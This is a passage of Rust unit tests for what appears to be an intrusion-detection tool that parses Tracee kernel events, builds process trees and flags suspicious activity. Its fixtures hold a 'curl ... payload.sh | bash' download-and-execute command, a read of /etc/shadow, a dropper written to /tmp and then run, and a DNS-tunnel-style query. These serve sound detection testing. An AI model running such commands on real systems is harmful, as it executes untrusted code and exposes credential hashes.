            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };

        let tree =
            ProcessTree::build(&[parent_exec, child_fork, child_exec]).expect("tree should build");

        let node = tree.get_by_pid(4242).expect("child pid should exist");
        assert_eq!(node.process_key, "tracee:4242:1718611199");
        assert_eq!(node.ppid, Some(4230));
        assert_eq!(node.comm.as_deref(), Some("bash"));
        assert_eq!(node.exe_path.as_deref(), Some("/usr/bin/bash"));
        assert_eq!(
            node.cmdline.as_deref(),
            Some("bash -lc curl http://10.0.0.5/payload.sh | bash")
        );

        let ancestry = tree.ancestry_by_pid(4242, 8);
        assert_eq!(ancestry.len(), 2);
        assert_eq!(ancestry[1].pid, 4230);
    }

    #[test]
    fn parse_related_file_and_network_events() {
        let exec = RawEvent {
            id: "tracee:1718611200:sched_process_exec:4242:1".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611200,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611200,"eventName":"sched_process_exec","hostName":"blue","processId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/usr/bin/bash"},{"name":"argv","value":["bash","-c","curl http://10.0.0.5/payload.sh | bash"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611200,
        };
        let net = RawEvent {
            id: "tracee:1718611202:tcp_connect:4242:2".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "tcp_connect".to_string(),
            observed_at: 1718611202,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611202".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611202,"eventName":"tcp_connect","hostName":"blue","processId":4242,"threadId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"sockfd","value":3},{"name":"remote_addr","value":"10.0.0.5"},{"name":"remote_port","value":8443}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611202,
        };
        let lateral = RawEvent {
            id: "tracee:1718611203:tcp_connect:4242:3".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "tcp_connect".to_string(),
            observed_at: 1718611203,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611203".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611203,"eventName":"tcp_connect","hostName":"blue","processId":4242,"threadId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"sockfd","value":4},{"name":"remote_addr","value":"10.0.0.9"},{"name":"remote_port","value":22}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611203,
        };
        let file = RawEvent {
            id: "tracee:1718611204:security_file_open:4242:4".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "security_file_open".to_string(),
            observed_at: 1718611204,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611204".to_string()),
            severity: Some(6),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611204,"eventName":"security_file_open","hostName":"blue","processId":4242,"threadId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/etc/shadow"},{"name":"flags","value":"O_RDONLY"}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611204,
        };

        let events = vec![exec, net, lateral, file];
        let files = file_events_for_pid(&events, 4242);
        let networks = network_events_for_pid(&events, 4242);

        assert_eq!(files.len(), 1);
        assert_eq!(files[0].file_path, "/etc/shadow");
        assert_eq!(files[0].flags.as_deref(), Some("O_RDONLY"));
        assert!(files[0].sensitive);

        assert_eq!(networks.len(), 2);
        assert_eq!(networks[0].remote_addr.as_deref(), Some("10.0.0.5"));
        assert_eq!(networks[0].remote_port, Some(8443));
        assert!(!networks[0].external);
        assert!(!networks[0].lateral_movement_hint);
        assert_eq!(networks[1].remote_addr.as_deref(), Some("10.0.0.9"));
        assert_eq!(networks[1].remote_port, Some(22));
        assert!(!networks[1].external);
        assert!(networks[1].lateral_movement_hint);
    }

    #[test]
    fn parse_tracee_net_tcp_connect_dst_field() {
        let net = RawEvent {
            id: "tracee:1718611202:net_tcp_connect:4242:2".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "net_tcp_connect".to_string(),
            observed_at: 1718611202,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611202".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611202,"eventName":"net_tcp_connect","hostName":"blue","processId":4242,"threadId":4242,"parentProcessId":4230,"userId":0,"processName":"curl","args":[{"name":"dst","type":"string","value":"127.0.0.1"},{"name":"dst_port","type":"int32","value":18091},{"name":"dst_dns","type":"[]string","value":[]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611202,
        };

        let networks = network_events_for_pid(&[net], 4242);

        assert_eq!(networks.len(), 1);
        assert_eq!(networks[0].remote_addr.as_deref(), Some("127.0.0.1"));
        assert_eq!(networks[0].remote_port, Some(18091));
    }

    #[test]
    fn mark_external_and_lateral_network_hints() {
        let external = RelatedNetworkEvent {
            pid: 1,
            event_name: "tcp_connect".to_string(),
            remote_addr: Some("8.8.8.8".to_string()),
            remote_port: Some(443),
            external: super::is_external_ip("8.8.8.8"),
            lateral_movement_hint: super::is_lateral_movement_hint(Some("8.8.8.8"), Some(443)),
            observed_at: 1,
        };
        let lateral = RelatedNetworkEvent {
            pid: 2,
            event_name: "tcp_connect".to_string(),
            remote_addr: Some("10.0.0.9".to_string()),
            remote_port: Some(22),
            external: super::is_external_ip("10.0.0.9"),
            lateral_movement_hint: super::is_lateral_movement_hint(Some("10.0.0.9"), Some(22)),
            observed_at: 1,
        };

        assert!(external.external);
        assert!(!external.lateral_movement_hint);
        assert!(!lateral.external);
        assert!(lateral.lateral_movement_hint);
    }

    #[test]
    fn build_file_propagation_chain_from_write_and_exec() {
        let write = RawEvent {
            id: "tracee:1718611204:security_file_open:4242:4".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "security_file_open".to_string(),
            observed_at: 1718611204,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(6),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611204,"eventName":"security_file_open","hostName":"blue","processId":4242,"threadId":4242,"parentProcessId":4230,"userId":0,"processName":"bash","args":[{"name":"pathname","value":"/tmp/dropper"},{"name":"flags","value":"O_WRONLY|O_CREAT|O_TRUNC"}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611204,
        };
        let exec = RawEvent {
            id: "tracee:1718611206:sched_process_exec:5000:5".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "sched_process_exec".to_string(),
            observed_at: 1718611206,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:5000:1718611206".to_string()),
            severity: Some(5),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611206,"eventName":"sched_process_exec","hostName":"blue","processId":5000,"parentProcessId":4242,"userId":0,"processName":"dropper","args":[{"name":"pathname","value":"/tmp/dropper"},{"name":"argv","value":["/tmp/dropper","--run"]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611206,
        };

        let chain = file_propagation_for_path(&[write, exec], "/tmp/dropper");

        assert_eq!(chain.write_events.len(), 1);
        assert_eq!(chain.exec_events.len(), 1);
        assert_eq!(chain.write_events[0].pid, 4242);
        assert_eq!(chain.exec_events[0].pid, 5000);
    }

    #[test]
    fn parse_dns_events_and_mark_high_entropy_queries() {
        let dns = RawEvent {
            id: "tracee:1718611205:net_packet_dns_request:4242:5".to_string(),
            source_kind: "tracee".to_string(),
            source_name: "tracee".to_string(),
            event_name: "net_packet_dns_request".to_string(),
            observed_at: 1718611205,
            host_id: Some("blue".to_string()),
            hostname: Some("blue".to_string()),
            process_key: Some("tracee:4242:1718611200".to_string()),
            severity: Some(6),
            payload_ref: None,
            payload_json: Some(r#"{"timestamp":1718611205,"eventName":"net_packet_dns_request","hostName":"blue","processId":4242,"parentProcessId":4230,"processName":"bash","args":[{"name":"metadata","value":{"src":"127.0.0.1","dst":"8.8.8.8","src_port":53000,"dst_port":53}},{"name":"dns_questions","value":[{"query":"google.com","query_type":"A","query_class":"IN"},{"query":"dGhpcy1pcy1hLWRucy10dW5uZWwtcGF5bG9hZA.example.com","query_type":"TXT","query_class":"IN"}]}]}"#.to_string()),
            ingest_method: "tracee-ndjson".to_string(),
            ingest_job_id: None,
            created_at: 1718611205,
        };

        let events = dns_events_for_pid(&[dns], 4242);

        assert_eq!(events.len(), 2);
        assert_eq!(events[0].query, "google.com");
        assert!(!events[0].high_entropy);
        assert_eq!(events[1].dst_port, Some(53));
        assert!(events[1].high_entropy);
        assert!(events[1].entropy >= 4.0);
    }
}
